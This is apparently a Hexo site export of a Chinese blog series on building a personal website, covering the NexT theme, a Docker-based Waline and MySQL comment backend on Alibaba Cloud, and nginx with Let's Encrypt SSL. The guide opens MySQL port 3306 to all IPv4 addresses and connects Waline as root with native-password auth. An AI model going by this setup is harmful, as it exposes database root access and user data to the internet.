<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="symbol">theme:</span> <span class="keyword">next</span></span><br></pre></td></tr></table></figure>

<p>现在就算完成了next的安装，可以用我们hexo的命令三件套进行测试：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo <span class="selector-tag">g</span></span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>然后到localhost:4000中去查看界面。</p>
<h3 id="进阶设置"><a href="#进阶设置" class="headerlink" title="进阶设置"></a>进阶设置</h3><p>进阶设置有很多很多，包括主题设置、侧边栏、logo、页脚、菜单栏、国际化、博客、评论等等等等，这里不赘述了，直接上教程(好吧我偷懒了)。</p>
<p>如果你是用npm install的方式安装的next，建议先将blog&#x2F;node_modules&#x2F;hexo-theme-next文件夹复制到blog&#x2F;theme&#x2F;中，并改名为next（即blog&#x2F;theme&#x2F;next），以后你对样式的修改可以直接操作该目录。</p>
<p>这里面hexo样式生效的顺序大致是 <code>blog/source/_data</code>  &gt;  <code>blog/theme/next</code>  &gt; <code>blog/node_modules/hexo-theme-next</code> (前者会覆盖后者）。</p>
<ul>
<li><p><a href="https://theme-next.js.org/docs/getting-started/">Getting Started | NexT</a></p>
</li>
<li><p><a href="https://zxblog.eu.org/posts/5a75/">【2024教程全】Hexo博客 + nexT主题</a></p>
</li>
<li><p><a href="https://blog.csdn.net/Bennnnnnn/article/details/128000842">Hexo-Next主题搭建个人博客最新配置教程！</a></p>
</li>
</ul>
<h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>经过这些配置，网页基本就比较美观了，接下来会讲如何购买个性化的域名，以及如何绑定到GItlab Pages中，让我们可以通过域名直接访问网站。</p>
]]></content>
      <categories>
        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>个人网页</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（十）—— 评论系统（二）</title>
    <url>/2024/12/17/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E5%8D%81%EF%BC%89%E2%80%94%E2%80%94%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>本章主要讲如何为个人网站增加评论系统。</p>
<p>上一章搭评论系统用的是 Waline+Leancloud数据库+Vercel服务端 的方案，今天介绍一种 <strong>服务器docker + waline + mysql</strong> 方案，还是继续用之前买的阿里云ECS服务器。</p>
<p>首先要说明，该方案要比上一章的方案复杂一些，主要是由于要为服务器配置SSL证书，还要求域名备案，好处在于你能对评论数据库和服务端有完全的掌控，请参考选择。</p>
<h3 id="安装docker并拉取所需镜像"><a href="#安装docker并拉取所需镜像" class="headerlink" title="安装docker并拉取所需镜像"></a>安装docker并拉取所需镜像</h3><p>进入服务器命令行，下载并安装docker：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sudo sh get-docker.sh</span><br></pre></td></tr></table></figure>

<p>然后可以进行docker换源，但是总感觉服务器的dockerhub不是最新的，所以我选择了在本地机的docker拉取所需的镜像，然后通过docker save和scp上传到服务器中，再用docker load加载镜像，具体如下（如果你能确保dockerhub能拉到最新的镜像，直接在服务器里运行下面的两个<code>docker pull</code>命令即可）：</p>
<span id="more"></span>

<p>在本地机中（确保你本地机安装了docker，并且docker服务已启动）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull mysql:8.0  # 拉取 MySQL8.0 镜像</span><br><span class="line">docker save -o mysql.tar mysql:8.0  # 将 MySQL8.0 镜像保存为tar文件</span><br><span class="line">scp mysql.tar root@&lt;你的服务器公网ip&gt;:~  # 将 mysql.tar 文件通过 SCP 传输到服务器</span><br><span class="line"></span><br><span class="line">docker pull lizheming/waline:latest # 拉取 Waline 镜像</span><br><span class="line">docker save -o waline.tar lizheming/waline:latest</span><br><span class="line">scp waline.tar root@&lt;你的服务器公网ip&gt;:~</span><br></pre></td></tr></table></figure>

<p>然后在服务器中：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker load -i mysql.tar # 从tar文件加载 MySQL 镜像</span><br><span class="line">docker load -i waline.tar</span><br><span class="line">docker images  # 查看所有docker镜像</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241217224933907.png" alt="image-20241217224933907"></p>
<p>别忘了把本地机和服务器里的tar文件删除，以免占用空间。</p>
<h3 id="配置安全组"><a href="#配置安全组" class="headerlink" title="配置安全组"></a>配置安全组</h3><p>到阿里云ECS控制台，左侧 网络与安全&#x2F;安全组，创建一个安全组，入规则方向，手动添加两个规则，协议类型选TCP，端口分别为8360和3306，授权对象为所有ipv4，如下图：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/b6e858ac943134d3ad794603cb468629.png" alt="b6e858ac943134d3ad794603cb468629"></p>
<p>然后选择刚刚创建的安全组，进入实例列表，实例加入安全组，实例选择你的服务器，确定。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/299e27ec292904e1620f729f3127600d.png" alt="299e27ec292904e1620f729f3127600d"></p>
<h3 id="部署MySQL数据库"><a href="#部署MySQL数据库" class="headerlink" title="部署MySQL数据库"></a>部署MySQL数据库</h3><p>首先创建一个docker卷，用以持久化数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker volume create mysql-data</span><br></pre></td></tr></table></figure>

<p>使用docker快速部署mysql数据库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name waline-mysql \</span><br><span class="line">  -v mysql-data:/var/lib/mysql \</span><br><span class="line">  -e MYSQL_ROOT_PASSWORD=&lt;root密码&gt; \</span><br><span class="line">  -e MYSQL_DATABASE=db_waline \</span><br><span class="line">  -p 3306:3306 \</span><br><span class="line">  mysql:8.0</span><br></pre></td></tr></table></figure>

<p>输入<code>docker ps -a</code>查看容器是否运行正常。</p>
<p>然后获取<a href="https://github.com/lizheming/waline/blob/master/assets/waline.sql">waline.sql</a>，但是官网给的这个sql脚本有语法问题，执行不起来，下面贴个修改后正确的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;</span><br><span class="line">/*!40101 SET NAMES utf8 */;</span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;</span><br><span class="line">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#x27;NO_AUTO_VALUE_ON_ZERO&#x27; */;</span><br><span class="line">/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Dump of table wl_Comment</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">CREATE TABLE `wl_Comment` (</span><br><span class="line">  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `user_id` int(11) DEFAULT NULL,</span><br><span class="line">  `comment` text,</span><br><span class="line">  `insertedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP,</span><br><span class="line">  `ip` varchar(100) DEFAULT &#x27;&#x27;,</span><br><span class="line">  `link` varchar(255) DEFAULT NULL,</span><br><span class="line">  `mail` varchar(255) DEFAULT NULL,</span><br><span class="line">  `nick` varchar(255) DEFAULT NULL,</span><br><span class="line">  `pid` int(11) DEFAULT NULL,</span><br><span class="line">  `rid` int(11) DEFAULT NULL,</span><br><span class="line">  `sticky` boolean DEFAULT NULL,</span><br><span class="line">  `status` varchar(50) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">  `like` int(11) DEFAULT NULL,</span><br><span class="line">  `ua` text,</span><br><span class="line">  `url` varchar(255) DEFAULT NULL,</span><br><span class="line">  `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP,</span><br><span class="line">  `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  INDEX `idx_comment_url` (`url`),</span><br><span class="line">  INDEX `idx_comment_user_id` (`user_id`),</span><br><span class="line">  INDEX `idx_comment_status` (`status`),</span><br><span class="line">  INDEX `idx_comment_pid_rid` (`pid`, `rid`),</span><br><span class="line">  INDEX `idx_comment_created_at` (`createdAt`),</span><br><span class="line">  INDEX `idx_comment_updated_at` (`updatedAt`),</span><br><span class="line">  INDEX `idx_comment_sticky` (`sticky`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Dump of table wl_Counter</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">CREATE TABLE `wl_Counter` (</span><br><span class="line">  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `time` int(11) DEFAULT NULL,</span><br><span class="line">  `reaction0` int(11) DEFAULT NULL,</span><br><span class="line">  `reaction1` int(11) DEFAULT NULL,</span><br><span class="line">  `reaction2` int(11) DEFAULT NULL,</span><br><span class="line">  `reaction3` int(11) DEFAULT NULL,</span><br><span class="line">  `reaction4` int(11) DEFAULT NULL,</span><br><span class="line">  `reaction5` int(11) DEFAULT NULL,</span><br><span class="line">  `reaction6` int(11) DEFAULT NULL,</span><br><span class="line">  `reaction7` int(11) DEFAULT NULL,</span><br><span class="line">  `reaction8` int(11) DEFAULT NULL,</span><br><span class="line">  `url` varchar(255) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">  `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP,</span><br><span class="line">  `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  INDEX `idx_counter_url` (`url`),</span><br><span class="line">  INDEX `idx_counter_time` (`time`),</span><br><span class="line">  INDEX `idx_counter_created_at` (`createdAt`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Dump of table wl_Users</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">CREATE TABLE `wl_Users` (</span><br><span class="line">  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `display_name` varchar(255) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">  `email` varchar(255) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">  `password` varchar(255) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">  `type` varchar(50) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">  `label` varchar(255) DEFAULT NULL,</span><br><span class="line">  `url` varchar(255) DEFAULT NULL,</span><br><span class="line">  `avatar` varchar(255) DEFAULT NULL,</span><br><span class="line">  `github` varchar(255) DEFAULT NULL,</span><br><span class="line">  `twitter` varchar(255) DEFAULT NULL,</span><br><span class="line">  `facebook` varchar(255) DEFAULT NULL,</span><br><span class="line">  `google` varchar(255) DEFAULT NULL,</span><br><span class="line">  `weibo` varchar(255) DEFAULT NULL,</span><br><span class="line">  `qq` varchar(255) DEFAULT NULL,</span><br><span class="line">  `2fa` varchar(32) DEFAULT NULL,</span><br><span class="line">  `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP,</span><br><span class="line">  `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE INDEX `idx_user_email` (`email`),</span><br><span class="line">  INDEX `idx_user_type` (`type`),</span><br><span class="line">  INDEX `idx_user_created_at` (`createdAt`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;</span><br><span class="line">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;</span><br><span class="line">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;</span><br></pre></td></tr></table></figure>

<p>再在容器中执行该sql脚本：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">docker exec -<span class="selector-tag">i</span> waline-mysql mysql -u root -<span class="selector-tag">p</span>&lt;root密码&gt; db_waline &lt; waline<span class="selector-class">.sql</span></span><br></pre></td></tr></table></figure>

<p>使用DataGrip测试mysql能否连接，同时查看表是否成功创建（也可以其他方法测试）：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/3671a41ad2b2ec487f4aba1f3932f961.png" alt="3671a41ad2b2ec487f4aba1f3932f961" style="zoom: 33%;" />

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/64c0cbd3514c8c1ba0d269f0556ba048.png" alt="64c0cbd3514c8c1ba0d269f0556ba048"></p>
<h3 id="部署Waline服务"><a href="#部署Waline服务" class="headerlink" title="部署Waline服务"></a>部署Waline服务</h3><p>然后使用docker快速部署waline服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name waline-server \</span><br><span class="line">  -p 8360:8360 \</span><br><span class="line">  -e MYSQL_HOST=&quot;&lt;服务器公网ip&gt;&quot; \</span><br><span class="line">  -e MYSQL_PORT=&quot;3306&quot; \</span><br><span class="line">  -e MYSQL_DB=&quot;db_waline&quot; \</span><br><span class="line">  -e MYSQL_USER=&quot;root&quot; \</span><br><span class="line">  -e MYSQL_PASSWORD=&quot;&lt; root密码&gt;&quot; \</span><br><span class="line">  -e MYSQL_PREFIX=&quot;wl_&quot; \</span><br><span class="line">  -e MYSQL_CHARSET=&quot;utf8mb4&quot; \</span><br><span class="line">  docker.io/lizheming/waline</span><br></pre></td></tr></table></figure>

<p>输入<code>docker ps -a</code>查看容器是否运行正常。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241217233935344.png" alt="image-20241217233935344"></p>
<p>此时访问 <code>&lt;你的服务器公网ip&gt;:8360</code> 测试是否能访问waline服务，并输入评论测试。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/a7433f7ca656ec5bc66ff4b951bf773e.png" alt="a7433f7ca656ec5bc66ff4b951bf773e" style="zoom: 33%;" />

<p>此时可能会出现以下的报错：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/8cb87c40994c6a4bd3d4387daaee0858.png" alt="8cb87c40994c6a4bd3d4387daaee0858" style="zoom:50%;" />

<p>这是由于 MySQL 8.0 引入了一个新的身份验证插件 <code>caching_sha2_password</code>，而较旧的 MySQL 客户端（包括某些 Node.js MySQL 客户端）默认不支持这种认证方式。</p>
<p>解决：进入 MySQL 容器并修改 <code>waline_user</code> 用户的认证方式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it waline-mysql mysql -u root -p</span><br></pre></td></tr></table></figure>

<p>然后在 MySQL 控制台中执行以下 SQL 命令来更改认证方式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;&lt;root密码&gt;&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<p>再次尝试，成功！</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218010327336.png" alt="image-20241218010327336" style="zoom:50%;" />

<h3 id="配置Hexo-next"><a href="#配置Hexo-next" class="headerlink" title="配置Hexo next"></a>配置Hexo next</h3><p>首先，在blog&#x2F;目录下安装waline：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install @waline/hexo-next --save</span><br></pre></td></tr></table></figure>

<p>然后打开next主题配置文件_config.next.yml，找个地方输入以下内容并保存：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Waline 评论</span></span><br><span class="line"><span class="comment"># For more information: https://waline.js.org, https://github.com/walinejs/waline</span></span><br><span class="line"><span class="attr">waline:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> </span><br><span class="line">  <span class="attr">serverURL:</span> <span class="string">http://&lt;你的公网ip&gt;:8360</span> <span class="comment"># Waline服务端地址</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">请文明评论呀~</span> <span class="comment"># 评论框的默认文字</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">mm</span> <span class="comment"># 头像风格</span></span><br><span class="line">  <span class="attr">meta:</span> [<span class="string">nick</span>, <span class="string">mail</span>, <span class="string">link</span>] <span class="comment"># 自定义评论框上面的三个输入框的内容</span></span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span> <span class="comment"># 评论数量多少时显示分页</span></span><br><span class="line">  <span class="attr">lang:</span> <span class="string">zh-cn</span> <span class="comment"># 语言, 可选值: en, zh-cn</span></span><br><span class="line">  <span class="comment"># Warning: 不要同时启用 `waline.visitor` 以及 `leancloud_visitors`.</span></span><br><span class="line">  <span class="attr">visitor:</span> <span class="literal">true</span> <span class="comment"># 文章阅读统计</span></span><br><span class="line">  <span class="attr">comment_count:</span> <span class="literal">true</span> <span class="comment"># 如果为 false , 评论数量只会在当前评论页面显示, 主页则不显示</span></span><br><span class="line">  <span class="attr">requiredFields:</span> [<span class="string">nick</span>] <span class="comment"># 设置用户评论时必填的信息，[nick,mail]: [nick] | [nick, mail]</span></span><br><span class="line">  <span class="attr">libUrl:</span> <span class="comment"># Set custom library cdn url</span></span><br></pre></td></tr></table></figure>

<p>然后使用命令三件套测试，到网页进行评论：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218012550130.png" alt="image-20241218012550130" style="zoom:50%;" />

<h3 id="配置SSL证书"><a href="#配置SSL证书" class="headerlink" title="配置SSL证书"></a>配置SSL证书</h3><p>但此时，如果你hexo d部署后，如果尝试进行评论会报错“Failed to fetch”，查看<code>docker logs waline-server</code>会发现报错：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Mixed Content: The page <span class="keyword">at</span> &#x27;https:/xxxxxxx&#x27; was loaded <span class="keyword">over</span> HTTPS, <span class="keyword">but</span> requested an insecure resource </span><br></pre></td></tr></table></figure>

<p>这是典型的 <strong>混合内容问题</strong>（Mixed Content）。具体来说，问题出现在你的网站是通过 HTTPS 加载的，但是你请求的 Waline 服务是通过 HTTP 协议进行访问的。由于现代浏览器的安全策略，<strong>浏览器会阻止从 HTTPS 页面加载 HTTP 资源</strong>，从而导致评论功能无法正常工作。</p>
<p>因此我们需要为Waline 后端设置 SSL 证书，使其能够通过 HTTPS 协议提供服务。</p>
<h4 id="设置子域名"><a href="#设置子域名" class="headerlink" title="设置子域名"></a>设置子域名</h4><p>由于 <strong>Let’s Encrypt</strong> 只会为域名发放证书，而不会给IP地址发放，因此我们需要为waline服务（也就是服务器）绑定一个域名。但是我们的域名已经绑定到我们的网站了，怎么办呢？</p>
<p>可以将服务器绑定到一个子域名，比如我们的域名是 jinqiqing.cn，那么我们将服务器IP绑定到 ecs.jinqiqing.cn 和 waline.jinqiqing.cn 两个子域名（这两个子域名都指向同一个ip，只是为了名字好看）。在域名控制台，进入 <strong>域名解析</strong>，按如下添加记录。</p>
<p>此外，以后还可以使用<code>ssh root@ecs.jinqiqing.cn</code>的方式连接服务器了，不用再记难记的ip地址。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/7243b6100cff0ad396dfaff281c56f49.png" alt="7243b6100cff0ad396dfaff281c56f49" style="zoom: 33%;" />

<h4 id="为域名配置SSL证书"><a href="#为域名配置SSL证书" class="headerlink" title="为域名配置SSL证书"></a>为域名配置SSL证书</h4><p>使用免费的 <strong>Let’s Encrypt</strong> SSL 证书，配合 <strong>Certbot</strong> 工具来自动化安装和配置证书，在服务器执行命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install certbot</span><br><span class="line">certbot certonly --standalone -d &lt;你的服务器域名&gt;</span><br></pre></td></tr></table></figure>

<p>然后按照提示操作。结果我遇到了403 Forbidden报错：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/c64456c40a7c3d4ee0a459fca42abb4e.png" alt="c64456c40a7c3d4ee0a459fca42abb4e"></p>
<p>结果发现：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/bc121a041a97e2e58a164772ea7bf214.png" alt="bc121a041a97e2e58a164772ea7bf214"></p>
<p>看来还是需要进行<strong>域名备案</strong>啊。</p>
<p>备案成功后，再次尝试：<br><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/7d5c66aded438104337d37340c69fb8b.png" alt="7d5c66aded438104337d37340c69fb8b"></p>
<p>成功，同时可以发现，<strong>证书有效期是90天</strong>。</p>
<p>然后用nginx配置证书：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">apt install nginx python3-certbot-nginx</span><br><span class="line">certbot <span class="comment">--nginx</span></span><br></pre></td></tr></table></figure>

<p>然后会跳出交互，问为哪个域名配置，输入域名。然后会问是不是用已有的证书配置，输入 1（是）。</p>
<p>但此时，我们只是能通过https访问<code>ecs.jinqiqing.cn</code>，还不能访问<code>https://ecs.jinqiqing.cn:8360</code>；但是我们不能用nginx配置监听8360端口，因为waline服务占用了该端口。一个取巧的办法是，我们让网站访问<code>https://ecs.jinqiqing.cn:8359</code>端口，然后让nginx监听ssl的8359端口，同时转发到8360，这样就完成了目标。</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-enable/</span><span class="keyword">default</span></span><br></pre></td></tr></table></figure>

<p>编辑该文件，在最后加入：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">8359</span> ssl; <span class="comment"># 监听8359端口</span></span><br><span class="line">    <span class="attribute">server_name</span> 服务器域名;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/服务器域名/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/服务器域名/privkey.pem;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1.<span class="number">2</span> TLSv1.<span class="number">3</span>;</span><br><span class="line">    <span class="attribute">ssl_ciphers</span> <span class="string">&#x27;TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:8360;  <span class="comment"># 转发请求到本地的 8360 端口</span></span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>保存后重启nginx服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>

<p>别忘了在服务器的安全组中加上8359端口。</p>
<p>把hexo-next中的配置修改为：</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">serverURL:</span> https://服务器域名:<span class="number">8359</span> <span class="meta"># Waline服务端地址</span></span><br></pre></td></tr></table></figure>

<p>然后进行测试。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241223115439656.png" alt="image-20241223115439656"></p>
<p>成功！</p>
]]></content>
      <categories>
        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>个人网页</tag>
        <tag>阿里云</tag>
        <tag>域名</tag>
        <tag>ECS</tag>
        <tag>Waline</tag>
        <tag>mysql</tag>
        <tag>docker</tag>
        <tag>ssl</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（零）—— 开始</title>
    <url>/2024/12/12/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E9%9B%B6%EF%BC%89%E2%80%94%E2%80%94%E5%BC%80%E5%A7%8B/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>这系列文章主要讲讲如何从零开始搭建个人网页，其实也就是本网站是如何被搭建起来的，当然作者也是这几天从零开始一点点尝试的，所以有很多地方可能还不成熟或者有问题，请谅解。</p>
<p>本文是一个开始，主要介绍下我们需要用到哪些技术和工具。</p>
<p>首先，你在开始之前，应当已经了解以下知识：</p>
<ul>
<li>**Node.js 和 NPM：**Node.js 是一个 JavaScript 运行环境，NPM 是其包管理器。Hexo 的运行和插件安装都依赖于 Node.js 和 NPM。</li>
<li>**Git：**Git 是一个分布式版本控制系统，用于管理代码和项目的变更。搭建网站时，Git 可以帮助我们在本地开发后将代码推送到远程仓库（如 GitLab）。</li>
<li>**Github或Gitlab：**GitHub 和 GitLab 是两款广泛使用的代码托管和协作平台，帮助开发者管理项目、版本控制和团队协作。如果你比较了解Github，那Gitlab对你而言也会很熟悉。</li>
<li>**Markdown：**Markdown 是一种轻量级的标记语言，使用简单的语法即可快速编写格式化的文本。这里我们所有的博客其实都是一份份Markdown文件（简称md），因此你需要掌握基本的Markdown语法。</li>
</ul>
<p><strong>此外，本系列文章中的教程大多基于我的配置编写，文中提到的许多内容需要根据你的实际情况进行调整。我使用的是 Windows 11，如果你使用的是 Linux 或 macOS，有些地方也需要进行相应的调整。</strong></p>
<span id="more"></span>

<h3 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h3><p>我的实现方案由以下组成，这些内容在接下来的文章中都会一一讲解。</p>
<ul>
<li><p><strong>Hexo</strong>：Hexo 是本系列的主角，它是一个快速、简洁且功能强大的静态博客框架，主要用于生成静态网页，其优势就是简单便捷，不需要写任何的前后端代码。</p>
</li>
<li><p><strong>Hexo NexT</strong>：Next 是 Hexo 的一款主题，其特点是简洁清晰美观，可扩展性强。</p>
</li>
<li><p>**Gitlab Pages：**GitLab Pages 提供免费的静态网站托管服务。我们可以将 Hexo 生成的静态文件上传到 GitLab，利用其 CI&#x2F;CD 管道自动部署到 Pages 上，然后就能访问到我们的网站了。当然，GitLab Pages只是可选的方案之一，也有其他方法。</p>
</li>
<li><p>**阿里云域名（可选，付费）：**虽然Gitlab Pages会提供一个网址（例如jinqq.gitlab.io）让我们能访问网站，但是如果有个性化域名（例如<a href="">jinqiqing.cn</a>)就更好了，一个.cn域名首次购买现在是39元&#x2F;两年，.com域名就贵了，大概要89元&#x2F;两年。</p>
</li>
<li><p><strong>阿里云OSS（可选，付费）：<strong>直接在markdown文件里插入的图片都是存在本地的，所以其他人是无法看到图片的，因此需要一个云服务</strong>图床</strong>来存储这些图片，阿里云OSS（对象存储服务）40G大概是27元&#x2F;三年。此外阿里云OSS也有静态网站托管服务，可以用来替代Gitlab Pages，这一点在第六章有阐述。</p>
</li>
</ul>
<h3 id="提前准备"><a href="#提前准备" class="headerlink" title="提前准备"></a>提前准备</h3><h4 id="Node-js-和-NPM"><a href="#Node-js-和-NPM" class="headerlink" title="Node.js 和 NPM"></a><strong>Node.js 和 NPM</strong></h4><p>确保你的电脑上安装好了node.js和npm，建议较新版本，输入以下命令确认：</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">node</span> <span class="title">-v</span></span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure>

<h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h4><p>确保你的电脑上安装有git，同时配置好了ssh，这里不详细展开了。</p>
<h4 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h4><p>确保你拥有一个Gitlab账号，当然如果你不打算将网页布置Gitlab Pages上就不需要了。</p>
